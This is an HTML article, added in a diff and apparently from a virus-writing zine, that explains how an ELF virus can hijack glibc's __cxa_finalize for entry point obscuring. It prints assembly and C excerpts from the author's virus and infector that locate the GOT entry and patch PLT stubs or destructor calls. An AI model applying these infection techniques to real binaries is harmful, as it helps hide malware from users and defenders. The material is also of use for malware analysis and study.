@@ -1,0 +1,470 @@
+<html>
+<head>
+<title>Hijacking __cxa_finalize to achieve entry point obscuring</title>
+<meta charset="utf-8">
+<link href="./style.css" rel="stylesheet" type="text/css">
+</head>
+<body>
+<div class="txtdiv"><pre>
+                                                      ┌───────────────────────┐
+                                                      ▄▄▄▄▄ ▄▄▄▄▄ ▄▄▄▄▄       │
+                                                      │ █   █ █ █ █   █       │
+                                                      │ █   █ █ █ █▀▀▀▀       │
+                                                      │ █   █   █ █     ▄     │
+                                                      │                 ▄▄▄▄▄ │
+                                                      │                 █   █ │
+                                                      │                 █   █ │
+                                                      │                 █▄▄▄█ │
+                                                      │                 ▄   ▄ │
+                                                      │                 █   █ │
+                                                      │                 █   █ │
+                                                      │                 █▄▄▄█ │
+                                                      │                 ▄▄▄▄▄ │
+Hijacking __cxa_finalize to achieve                   │                   █   │
+entry point obscuring                                 │                   █   │
+~ vrzh                                                └───────────────────█ ──┘
+
+Hijacking the destruction mechanism is an effective entry point obscuring (EPO)
+virus technique, so long as the delayed execution doesn't impede functionality
+of the virus or the host. A common example of this technique is patching the
+the destructor array. In the first tmp.out issue [0], s01den and sblip
+published their Linux.Eng3ls virus, which used this EPO technique. The virus
+also uses a number of other cool techniques and I strongly recommend you check
+it out, as well as s01den's follow-up note on EPO techniques in tmp.out #2 [1].
+The C++ ABI spec exposes another, less obvious target for hijacking code
+execution - __cxa_finalize(). In this txt I'm going to describe the purpose of
+__cxa_finalize(), touch on how it fits in the ELF destruction process, and
+present two methods of hijacking it.
+
+Two pieces of my code supplement this txt:
+  ▪ A virus Linux.ElizaCanFix, which implements Method 0.
+  ▪ An infector [2] written in C, which implements both hijacking methods.
+
+Both programs use Silvio Cesare's text segment padding infection [3], but any
+other infection method can be used. Detailing the infection method is out of
+the scope of this txt.
+ ╓                           ╖
+═╣ What is __cxa_finalize()? ╠═════════════════════════════════════════════════
+ ╙                           ╜
+The purpose of __cxa_finalize() function is to run C++ object destructors. It's
+defined as a part of the the Itanium C++ ABI specification [4], more precisely
+the Dynamic Shared Object (DSO) destruction at runtime. According to the spec,
+the DSO object destruction API consists of two components:
+
+▪ __cxa_atexit()
+
+┌─┤ glibc ├─────────────────────────────────────────┤ stdlib/cxa_atexit.c ├───┐
+│                                                                             │
+│ int __cxa_atexit (void (*func) (void *), void *arg, void *d)                │
+└─────────────────────────────────────────────────────────────────────────────┘
+  __cxa_atexit() registers a destructor routine func with an argument arg for a
+  DSO handle d. A DSO handle is an address in one of the DSO's segments. It can
+  be any address as long as it is unique per-DSO. The linker exposes this
+  handle via a hidden symbol __dso_handle.
+
+▪ __cxa_finalize()
+
+┌─┤ glibc ├───────────────────────────────────────┤ stdlib/cxa_finalize.c ├───┐
+│                                                                             │
+│ void __cxa_finalize (void *d)                                               │
+└─────────────────────────────────────────────────────────────────────────────┘
+  __cxa_finalize() calls all destructors for the DSO represented by the handle
+  d in a manner that conforms to the C++ standard (i.e. destructors are called
+  in the order opposite to their registration).
+
+Despite it appearing in a C++ specification, this mechanism is expected to be
+implemented for code written in C as well, since C-only Dynamic Shared Objects
+still have to interact with C++ programs in a spec-conforming manner. The spec
+also notes that these functions are not be exposed to the programmer directly.
+In GNU libc atexit(3) is simply a wrapper around __cxa_atexit(), although the
+only argument exposed to the caller is the function pointer to the destructor.
+
+Itanium ABI is a widely accepted specification and one is likely to find this
+mechanism in dynamically linked binaries compiled with common frameworks such
+as gcc and clang. GNU libc, for example, implemented it in the late 90's.
+Throughout this txt I will be using glibc as the reference libc implementation.
+ ╓                      ╖
+═╣ Beginning of the end ╠══════════════════════════════════════════════════════
+ ╙                      ╜
+The return value of the main() function is passed to exit(), which in turn is
+a wrapper around __run_exit_handlers():
+
+┌─┤ glibc ├──────────────────────┤ sysdeps/generic/libc_start_call_main.h ├───┐
+│                                                                             │
+│   _Noreturn static __always_inline void                                     │
+│   __libc_start_call_main (int (*main) (int, char **,                        │
+│                                        char ** MAIN_AUXVEC_DECL),           │
+│                           int argc,                                         │
+│                           char **argv MAIN_AUXVEC_DECL)                     │
+│   {                                                                         │
+│   exit (main (argc, argv, __environ MAIN_AUXVEC_PARAM));                    │
+│   }                                                                         │
+├─────────────────────────────────────────────────────────┤ stdlib/exit.c ├───┤
+│ void                                                                        │
+│ exit (int status)                                                           │
+│ {                                                                           │
+│   __run_exit_handlers (status, &__exit_funcs, true, true);                  │
+│ }                                                                           │
+│ ...                                                                         │
+│ void                                                                        │
+│ attribute_hidden                                                            │
+│ __run_exit_handlers (int status, struct exit_function_list **listp,         │
+│              bool run_list_atexit, bool run_dtors)                          │
+│ {                                                                           │
+│ ...                                                                         │
+│       case ef_cxa:                                                          │
+│         /* To avoid dlclose/exit race calling cxafct twice (BZ 22180),      │
+│        we must mark this function as ef_free.  */                           │
+│         f->flavor = ef_free;                                                │
+│         cxafct = f->func.cxa.fn;                                            │
+│         arg = f->func.cxa.arg;                                              │
+│         PTR_DEMANGLE (cxafct);                                              │
+│                                                                             │
+│         /* Unlock the list while we call a foreign function.  */            │
+│         __libc_lock_unlock (__exit_funcs_lock);                             │
+│         cxafct (arg, status);                                               │
+│         __libc_lock_lock (__exit_funcs_lock);                               │
+│         break;                                                              │
+│ ...                                                                         │
+└─────────────────────────────────────────────────────────────────────────────┘
+A function registered with __cxa_atexit() is added to the __exit_funcs list of
+destructors (struct exit_function_list). In the above code excerpt you can see
+that it is the same list that is passed to __run_exit_handlers() in exit().
+__run_exit_handlers() will cycle through the list, executing destructors
+according to their flavor. The flavor is used to distinguish how the destructor
+must be executed, specifically the destructor's prototype and in some cases
+additional cleanup code. Functions registered with __cxa_atexit() have the
+ef_cxa flavor and in the above snippet you can see how that case is handled.
+
+So wait... if those destructors are called in __run_exit_handlers(), when does
+__cxa_finalize() get called?!
+
+The System V ABI [5] states that at entry point the rdx register is reserved
+for a function pointer to be registered with atexit by the program. In the case
+of a dynamically linked executable, that function is expected to be the program
+interpreter's destructor. Indeed we can see its registration in libc's init
+code:
+
+┌─┤ glibc ├────────────────────────────────────────────┤ csu/libc-start.c ├───┐
+│                                                                             │
+│   /* Register the destructor of the dynamic linker if there is any.  */     │
+│   if (__glibc_likely (rtld_fini != NULL))                                   │
+│       __cxa_atexit ((void (*) (void *)) rtld_fini, NULL, NULL);             │
+└─────────────────────────────────────────────────────────────────────────────┘
+In glibc's dynamic linker, the destructor is _dl_fini() - here it is passed to
+to the loaded binary:
+
+┌─┤ glibc ├─────────────────────────────────┤ sysdeps/x86_64/dl-machine.h ├───┐
+│                                                                             │
+│     # Pass our finalizer function to the user in %rdx, as per ELF ABI.\n\   │
+│     leaq _dl_fini(%rip), %rdx\n\                                            │
+├─────────────────────────────────────────────────────────┤ elf/dl-fini.c ├───┤
+│ void                                                                        │
+│ _dl_fini (void)                                                             │
+│ {                                                                           │
+│   /* Lots of fun ahead.  ...                                                │
+└─────────────────────────────────────────────────────────────────────────────┘
+To keep it short (trust me you don't want to know what a libc developer thinks
+is fun) I will note that linker's destructor has many responsibilities, one of
+which is to call destructors in the fini_array if that mechanism is used (which
+is true for most modern ELFs). The first entry in this array is normally a
+pointer to destructor code inserted by the compiler. Here are some examples of
+such code:
+
+┌─┤ gcc ├─────────────────────────────────────────────┤ libgcc/crtstuff.c ├───┐
+│                                                                             │
+│   static void __attribute__((used))                                         │
+│   __do_global_dtors_aux (void)                                              │
+│   {                                                                         │
+│     ...                                                                     │
+│     if (__cxa_finalize)                                                     │
+│       __cxa_finalize (__dso_handle);                                        │
+│                                                                             │
+├─┤ llvm ├───────────────────────────────┤ compiler-rt/lib/crt/crtbegin.c ├───┤
+│                                                                             │
+│   static void __attribute__((used)) __do_fini(void) {                       │
+│     ...                                                                     │
+│                                                                             │
+│     if (__cxa_finalize)                                                     │
+│       __cxa_finalize (__dso_handle);                                        │
+│                                                                             │
+└─────────────────────────────────────────────────────────────────────────────┘
+We have arrived! If __cxa_finalize() function is provided, it will be executed
+by compiler's destructor code. It's at this point that we are most likely to
+hijack this function.
+ ╓                      ╖
+═╣ Payload Requirements ╠══════════════════════════════════════════════════════
+ ╙                      ╜
+This technique mandates a common-sense payload requirement - all non-volatile
+registers must be preserved. The payload will hand the execution back to the
+host and if we clobber a used non-volatile register (for example the sole
+argument to __cxa_finalize() in rdi) we are likely to core.
+ ╓                            ╖
+═╣ Method 0: Hijacking at PLT ╠════════════════════════════════════════════════
+ ╙                            ╜
+The primary method of hijacking __cxa_finalize() is to find and patch its PLT
+stub with a jmp to the first parasite instruction. The parasite should end with
+a jmp to __cxa_finalize(), referenced in GOT. To achieve this, we have to first
+determine the offset of the __cxa_finalize() GOT entry, then scan the PLT for
+the right stub.
+   ╭                    ╮
+───┤ A note on .plt.got ├──────────────────────────────────────────────────────
+   ╰                    ╯
+When a stub in .plt is called for the first time, the dynamic linker is invoked
+to resolve the absolute address of the target function and store it in the GOT
+for subsequent calls. A stub in .plt.got on the other hand, expects the GOT to
+already contain the absolute address of the function. Due to this, the .plt.got
+stubs are only 8 bytes long, as opposed to the 16-byte .plt stubs. Effectively,
+.plt.got stubs are padded jmp instructions:
+┌─────────────────────────────────────────────────────────────────────────────┐
+│ Disassembly of section .plt:                                                │
+│                                                                             │
+│   4090:       ff 25 9a ff 01 00       jmp    QWORD PTR [rip+0x1ff9a]        │
+│   4096:       68 06 00 00 00          push   0x6                            │
+│   409b:       e9 80 ff ff ff          jmp    4020                           │
+│                                                                             │
+│   40a0:       ff 25 92 ff 01 00       jmp    QWORD PTR [rip+0x1ff92]        │
+│   40a6:       68 07 00 00 00          push   0x7                            │
+│   40ab:       e9 70 ff ff ff          jmp    4020                           │
+│                                                                             │
+│ Disassembly of section .plt.got:                                            │
+│                                                                             │
+│   4640:       ff 25 52 f9 01 00       jmp    QWORD PTR [rip+0x1f952]        │
+│   4646:       66 90                   xchg   ax,ax                          │
+│                                                                             │
+│   4648:       ff 25 62 f9 01 00       jmp    QWORD PTR [rip+0x1f962]        │
+│   464e:       66 90                   xchg   ax,ax                          │
+└─────────────────────────────────────────────────────────────────────────────┘
+The stub for __cxa_finalize() is normally found in the .plt.got section. I
+suspect this is because __cxa_finalize() doesn't benefit from the lazy linking
+optimization - there isn't a case when it would be linked and not used.
+   ╭                                         ╮
+───┤ Finding the __cxa_finalize() GOT offset ├─────────────────────────────────
+   ╰                                         ╯
+The offset of the __cxa_finalize() GOT entry is found in a corresponding
+relocation structure in the .rela.dyn table. To find it we must walk the host's
+.rela.dyn, looking for the entry with a symbol __cxa_finalize. Again, here
+we differ from a regular PLT hijack, for which we'd be walking the .rela.plt
+table.
+
+┌─┤ Linux.ElizaCanFix.asm ├───────────────────────────────────────────────────┐
+│                                                                             │
+│ rela_dyn:                                                                   │
+│     .loop:                                                                  │
+│         mov rcx, [rsp] ; rela iterator                                      │
+│         cmp rcx, QWORD [r14 + host_data.rela_dyn_size]                      │
+│         jl .check_entry                                                     │
+│         ; we couldn't find the rela_dyn entry                               │
+│         add rsp, 8                                                          │
+│         jmp fail_infect                                                     │
+│                                                                             │
+│     .check_entry:                                                           │
+│         lea r9, [rbp + rcx] ; current .rela.dyn entry                       │
+│         mov rbx, QWORD [r9 + elf64_rela.r_info]                             │
+│         shr rbx, 32         ; Get the .dynsym table index                   │
+│                                                                             │
+│         ; calculate the .dynsym table offset                                │
+│         mov rcx, rbx                                                        │
+│         shl rcx, 4                                                          │
+│         shl rbx, 3                                                          │
+│         add rbx, rcx                                                        │
+│                                                                             │
+│         lea rbx, [r8 + rbx]     ; .dynsym entry                             │
+│         mov ebx, DWORD [rbx + elf64_sym.st_name]                            │
+│         mov rdi, [r14 + host_data.dyn_str]                                  │
+│         lea rdi, [rdi + rbx]    ; symbol string offset in .dynstr           │
+│         ; compare with "__cxa_finalize" string                              │
+│         mov rdx, cxa_fin_str_len                                            │
+│         lea rsi, [rel cxa_fin_str]                                          │
+│         lea r15, [rel _memcmp]                                              │
+│         call r15                                                            │
+│         test rdi, rdi                                                       │
+│         jnz .continue                                                       │
+│         ; we found the __cxa_finalize relocation data                       │
+│         mov r9, [r9 + elf64_rela.r_offset]                                  │
+│         lea r9, [rax + r9]      ; __cxa_finalize GOT offset                 │
+│         mov [r14 + host_data.cxa_finalize_offt], r9                         │
+│         jmp .done                                                           │
+└─────────────────────────────────────────────────────────────────────────────┘
+The relocation type should be R_X86_64_GLOB_DAT, which simply indicates that
+the r_offset field of the relocation entry points directly to the GOT entry.
+   ╭                                               ╮
+───┤ Finding the __cxa_finalize() stub in .plt.got ├───────────────────────────
+   ╰                                               ╯
+To find the correct stub, we scan the .plt.got section and check the operand of
+each jmp instruction. If the operand + address after the jmp equals the GOT
+entry address we found in the previous step - we've found the __cxa_finalize()
+stub.
+
+┌─┤ Linux.ElizaCanFix.asm ├───────────────────────────────────────────────────┐
+│                                                                             │
+│ plt_got:                                                                    │
+│     .loop:                                                                  │
+│         mov ebx, DWORD [rdx + rcx + 2]  ; jmp operand                       │
+│         lea r8, [rdx + rcx + 6]         ; address after the jmp             │
+│         add rbx, r8                     ; test offset                       │
+│         cmp rbx, QWORD [r14 + host_data.cxa_finalize_offt]                  │
+│         jne .next                                                           │
+│         lea rbx, [rdx + rcx]                                                │
+│         mov [r14 + host_data.addrof_pltgot_stub], rbx                       │
+│         jmp .done                                                           │
+│                                                                             │
+│     .next:                                                                  │
+│         add rcx, 8 ; size of a .plt.got stub                                │
+│         cmp rcx, [r14 + host_data.plt_got_len]                              │
+│         jl .loop                                                            │
+└─────────────────────────────────────────────────────────────────────────────┘
+Now we must calculate the offset to the virus and patch this jmp instruction.
+Note that in Linux.ElizaCanFix we're jumping within the same segment, so the
+patch uses a near jmp. If the infection was in a different segment we would
+instead need a far jmp.
+
+┌─┤ Linux.ElizaCanFix.asm ├───────────────────────────────────────────────────┐
+│                                                                             │
+│   ; patch the .plt.got stub with a jmp to parasite                          │
+│   mov rbx, [r14 + host_data.addrof_pltgot_stub]                             │
+│   mov BYTE [rbx], 0xe9    ; near jmp opcode                                 │
+│   mov rdi, [rsp + 16]     ; end of the code segment                         │
+│   lea rsi, [rbx + 5]      ; address after near jmp instruction              │
+│   sub rdi, rsi            ; jmp offset to parasite                          │
+│   mov DWORD [rbx + 1], edi                                                  │
+└─────────────────────────────────────────────────────────────────────────────┘
+Finally, we calculate the offset from the end of the infection to the
+__cxa_finalize() GOT entry and add it as the jmp operand in the virus epilogue.
+
+┌─┤ Linux.ElizaCanFix.asm ├───────────────────────────────────────────────────┐
+│                                                                             │
+│   ; set up the jump after the virus                                         │
+│   add rdi, rdx                ; end of the virus                            │
+│   mov WORD [rdi], 0x25ff      ; jmp QWORD PTR [rip + ?]                     │
+│   mov rsi, [r14 + host_data.cxa_finalize_offt]                              │
+│   lea rdx, [rdi + 6]          ; address after the jmp                       │
+│   sub rsi, rdx                ; new jmp offset to __cxa_finalize            │
+│   mov DWORD [rdi + 2], esi                                                  │
+└─────────────────────────────────────────────────────────────────────────────┘
+This should be it - presuming you've found a place for your virus, the host
+should now be infected.
+ ╓                                             ╖
+═╣ Method 1: Hijacking calls in the destructor ╠═══════════════════════════════
+ ╙                                             ╜
+Some Linux distributions, such as Arch (I use Arch btw), choose to build
+binaries with a no-plt optimization. The rationale behind this decision is
+optimizing for space - with a lot of imports the PLT can really blow up.
+For those cases, Method 0 obviously won't work. I didn't want to give up on
+those binaries though and came up with an alternative method. It's a bit wonky,
+but gets the job done.
+
+Recall that in both gcc and clang, the default destructor first checks whether
+__cxa_finalize() is NULL before calling it. This check takes place because the
+compiler doesn't know whether __cxa_finalize() will be exported by libc or
+another method will be used to run the destructors. This leaves a predictable
+pattern in the default destructor, which will allow us to find the hijacking
+point. The strategy is to scan for a QWORD PTR cmp (48 83 3d), followed a few
+instructions later by a QWORD PTR call (ff 15), both of which must have the
+same operand (the other cmp operand is 0). We can then use the call operand to
+calculate the GOT offset of __cxa_finalize(), patch the call to instead call
+the virus body, and finally just like in the previous method, simply jmp to
+the address in the __cxa_finalize() GOT entry.
+
+First though, we need to find the default destructor. As mentioned previously,
+it is normally the first entry in the fini_array so we get the .fini_array
+section offset, grab the first pointer, and calculate the file offset:
+
+┌─┤ infect_cxa_finalize.c ├───────────────────────────────────────────────────┐
+│                                                                             │
+│ static int get_host_sections(struct parasite_host *host)                    │
+│ {                                                                           │
+│     ...                                                                     │
+│     Elf64_Half i;                                                           │
+│     uint32_t *fini_array;                                                   │
+│     ...                                                                     │
+│     for (i = 0; i < host->elf->e_shnum; i++) {                              │
+│         switch (host->shdrs[i].sh_type) {                                   │
+│     ...                                                                     │
+│         case SHT_FINI_ARRAY:                                                │
+│         fini_array = (uint32_t *)((uint64_t)host->elf +                     │
+│                                   (uint64_t)host->shdrs[i].sh_offset);      │
+│         if (fini_array && fini_array[0]) {                                  │
+│             host->do_glob_dtors = (uint8_t *)((uint64_t)host->elf +         │
+│                                              (uint64_t)fini_array[0]);      │
+│         }                                                                   │
+│         break;                                                              │
+│     ...                                                                     │
+└─────────────────────────────────────────────────────────────────────────────┘
+Now it's time to scan it. This method of scanning will work in a pinch, but
+it's only a PoC. A stray c3 byte (ret) will cause an early loop termination.
+
+┌─┤ infect_cxa_finalize.c ├───────────────────────────────────────────────────┐
+│                                                                             │
+│ #define RET 0xc3                                                            │
+│ const uint8_t qwordcmp[] = { 0x48, 0x83, 0x3d };                            │
+│ const uint8_t qwordcall[] = { 0xff, 0x15 };                                 │
+│    ...                                                                      │
+│    for (i=0; host->do_glob_dtors[i+8] != RET; i++) {                        │
+│        if (!memcmp(&host->do_glob_dtors[i], qwordcmp, 3)) {                 │
+│            saved_offt = *(uint32_t *)&host->do_glob_dtors[i+3];             │
+│            cxafin_got = &host->do_glob_dtors[i+8] + saved_offt;             │
+│            DBG("[DEBUG][CMP] __cxa_finalize\t@%p\n", cxafin_got);           │
+│        }                                                                    │
+│                                                                             │
+│        if (!memcmp(&host->do_glob_dtors[i], qwordcall, 2)) {                │
+│            saved_offt = *(uint32_t *)&host->do_glob_dtors[i+2];             │
+│            if (cxafin_got == &host->do_glob_dtors[i+6] + saved_offt) {      │
+│                DBG("[DEBUG] Found __cxa_finalize\t@%p\n", cxafin_got);      │
+│                memcpy(&dtors_epilogue[DTORS_EPILOGUE_JMPOFFT],              │
+│                       &host->do_glob_dtors[i], 6);                          │
+│                host->hijack_site = &host->do_glob_dtors[i];                 │
+│                return 0;                                                    │
+│            }                                                                │
+│        }                                                                    │
+│    }                                                                        │
+└─────────────────────────────────────────────────────────────────────────────┘
+At this point we have all we need to finish the hijack. We patch the call site
+with a call to our virus..
+
+┌─┤ infect_cxa_finalize.c ├───────────────────────────────────────────────────┐
+│                                                                             │
+│ uint8_t call[6] = {                                                         │
+│   0xe8, 0x00, 0x00, 0x00, 0x00, // call ?                                   │
+│   0x90                          // nop                                      │
+│ };                                                                          │
+│                                                                             │
+│ uint32_t *call_operand = (uint32_t *)&call[1];                              │
+│ ...                                                                         │
+│     *call_operand = virus_offt;                                             │
+│     memcpy(host->hijack_site, call, 6);                                     │
+│ ...                                                                         │
+└─────────────────────────────────────────────────────────────────────────────┘
+.. and set the address of the __cxa_finalize() GOT entry as the jmp operand in
+the virus epilogue. The calculation for this jmp is exactly the same as in the
+previous method.
+
+Some of you might notice that we are replacing a far call with a near call -
+operations that differ in length. The purpose of the additional nop (90)
+instruction in the call[] array is to align with the surrounding destructor
+code and make sure __cxa_finalize() returns to a valid instruction. Again, this
+might not be necessary if your parasite lives in a different segment.
+
+This method isn't strictly limited to hijacking __cxa_finalize() - it can be
+adapted to hijack any call that can be found and reached with a predictable
+code pattern.
+ ╓               ╖
+═╣ Disadvantages ╠═════════════════════════════════════════════════════════════
+ ╙               ╜
+▪ This hijacking method is only applicable to dynamically linked executables.
+
+▪ If the binary can circumvent the destruction mechanism (e.g. through an
+  exit syscall or calls to quick_exit()/_Exit()) the virus will not be reached.
+
+▪ __cxa_finalize() might be called more than once per-execution, so if you take
+  the PLT hijacking route (Method 0) your parasite may be called again.
+ ╓            ╖
+═╣ References ╠════════════════════════════════════════════════════════════════
+ ╙            ╜
+[0] Lin64.Eng3ls: Some anti-RE techniques in a Linux virus [https://tmpout.sh/1/7.html]
+[1] A short note on entrypoint obscuring in ELF binaries [https://tmpout.sh/2/2.html]
+[2] [https://github.com/v-rzh/cxa-finalize-infect.git]
+[3] [https://web.archive.org/web/20210420163849/https://ivanlef0u.fr/repo/madchat/vxdevl/vdat/tuunix01.htm#11]
+[4] Itanium C++ ABI. [https://itanium-cxx-abi.github.io/cxx-abi/]
+[5] System V Application Binary Interface AMD64 Architecture Processor Supplement (29-30) [https://refspecs.linuxbase.org/elf/x86_64-abi-0.99.pdf]
+</pre></div></body>
